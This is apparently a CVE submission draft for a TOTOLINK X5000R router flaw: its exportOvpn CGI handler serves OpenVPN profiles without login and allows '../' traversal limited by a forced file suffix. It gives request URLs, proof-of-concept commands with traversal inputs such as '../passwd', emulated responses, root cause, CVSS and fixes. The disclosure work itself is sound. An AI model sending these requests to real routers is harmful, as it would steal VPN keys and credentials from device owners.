# CVE Form Draft: TOTOLINK X5000R exportOvpn

## Vulnerability Title

TOTOLINK X5000R cstecgi.cgi exportOvpn pre-authenticated OpenVPN profile disclosure and suffix-constrained path traversal

## Product

TOTOLINK X5000R

## Vendor

TOTOLINK

## Affected Versions

Verified affected:

- V9.1.0cu.2415_B20250515
- V9.1.0cu.2350_B20230313

Affected component:

```text
/web/cgi-bin/cstecgi.cgi
```

## Vulnerability Type

- Missing authorization
- Sensitive file disclosure
- Path traversal constrained by forced filename suffix

Suggested CWE:

- CWE-862: Missing Authorization
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

## Description

TOTOLINK X5000R `cstecgi.cgi` contains an `exportOvpn` handler that processes OpenVPN export requests before the normal web token/session authentication path. A remote unauthenticated attacker can request existing OpenVPN user profile files or archives. The handler also concatenates the user-controlled username value into `/etc/openvpn/server/user/%s.ovpn` or `/etc/openvpn/server/user/%s.tar.gz` without path normalization or directory boundary checks, allowing `../` traversal to read suffix-matching files outside the OpenVPN user directory.

This issue is a pre-authenticated OpenVPN profile disclosure and suffix-constrained path traversal vulnerability. Current evidence does not support a remote code execution claim.

## Attack Vector

Network-adjacent or network-reachable HTTP access to the router web service is sufficient. Authentication to the web management interface is not required.

Vulnerable request forms:

```text
/cgi-bin/cstecgi.cgi?exportOvpn&type=user&name=<username>&mode=config
/cgi-bin/cstecgi.cgi?exportOvpn&type=user&name=<username>&filetype=gz
```

The firmware parser is position-sensitive:

```text
arg0: contains exportOvpn
arg1: type=user
arg2: username field, for example name=<username> or username=<username>
arg3: mode=config or filetype=gz
```

## Impact

An unauthenticated attacker can download existing OpenVPN profile files or OpenVPN export archives. If those files contain client certificates, private keys, static keys, server addresses, or reusable VPN credentials, the attacker may obtain VPN access material without logging in to the web interface.

The traversal behavior is not a fully arbitrary file read. The file path is constrained by the forced suffix:

- `mode=config` appends `.ovpn`
- `filetype=gz` appends `.tar.gz`

## Reproduction

PoC file:

```text
pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py
```

Generate the request path:

```bash
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user alice --path-only
```

Fetch an OpenVPN profile:

```bash
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user alice
```

Fetch an OpenVPN `.tar.gz` archive:

```bash
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user alice --gz
```

Test suffix-constrained traversal:

```bash
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user ../passwd
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user ../passwd --gz
```

Representative verified responses from QEMU/chroot execution of the original MIPS CGI and firmware libraries:

```text
exportOvpn&type=user&name=alice&mode=config
HTTP/1.1 200 OK
OVPN_SECRET_FOR_ALICE

exportOvpn&type=user&name=alice&filetype=gz
HTTP/1.1 200 OK
TARGZ_SECRET_FOR_ALICE

exportOvpn&type=user&name=../passwd&mode=config
HTTP/1.1 200 OK
TRAVERSAL_SECRET

exportOvpn&type=user&name=../passwd&filetype=gz
HTTP/1.1 200 OK
TRAVERSAL_GZ_SECRET
```

The local harness pre-created representative OpenVPN output files in a temporary rootfs to model a configured device runtime state. The original firmware binaries and libraries were used, and the original firmware samples were not modified.

## Root Cause

Static strings and control-flow evidence in `/web/cgi-bin/cstecgi.cgi` show this behavior:

```text
exportOvpn
openvpn-cert build_user %s gz
/etc/openvpn/server/user/%s.tar.gz
openvpn-cert build_user %s config
/etc/openvpn/server/user/%s.ovpn
can not open config file
```

The effective vulnerable logic is:

```c
system("openvpn-cert build_user <username> config");
fopen("/etc/openvpn/server/user/<username>.ovpn", "rb");

system("openvpn-cert build_user <username> gz");
fopen("/etc/openvpn/server/user/<username>.tar.gz", "rb");
```

The handler is reachable before normal token/session authentication, and the username is used as a filesystem path component without normalization or directory boundary enforcement.

## Suggested CVSS

Suggested CVSS v3.1:

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
```

Suggested base score: 7.5 High.

Rationale: the vulnerability is remotely reachable, requires low attack complexity, requires no privileges or user interaction, and primarily impacts confidentiality. If a CNA considers the dependency on generated OpenVPN files a stronger environmental limitation, confidentiality impact may be adjusted downward.

## Duplicate-Differentiation Notes

Known related public issues:

- CVE-2025-14586: reported as an `exportOvpn&type=user` command injection in another X5000R version, publicly associated with `9.1.0cu.2089_B20211224`.
- CVE-2025-13184: reported as unauthenticated Telnet enablement through `action=telnet`.
- CVE-2025-9934: reported as a `cstecgi.cgi` command injection affecting `V9.1.0cu.2415_B20250515`.

This candidate is distinct from the above because the verified issue is not command execution or Telnet enablement. It is a pre-authenticated OpenVPN export file disclosure and suffix-constrained path traversal issue, verified on `V9.1.0cu.2415_B20250515` and `V9.1.0cu.2350_B20230313`. RCE attempts using common shell metacharacters were tested and did not produce command execution in the available evidence.

## Fix Recommendations

1. Move `exportOvpn` behind the same token/session authentication used by privileged web actions.
2. Validate usernames with a strict allowlist such as `^[A-Za-z0-9_-]{1,64}$`.
3. Normalize the final path and verify that it remains under `/etc/openvpn/server/user/`.
4. Do not allow unauthenticated requests to invoke `openvpn-cert build_user`.
5. Avoid `system()` string concatenation for external commands; use an argument-vector execution API where possible.

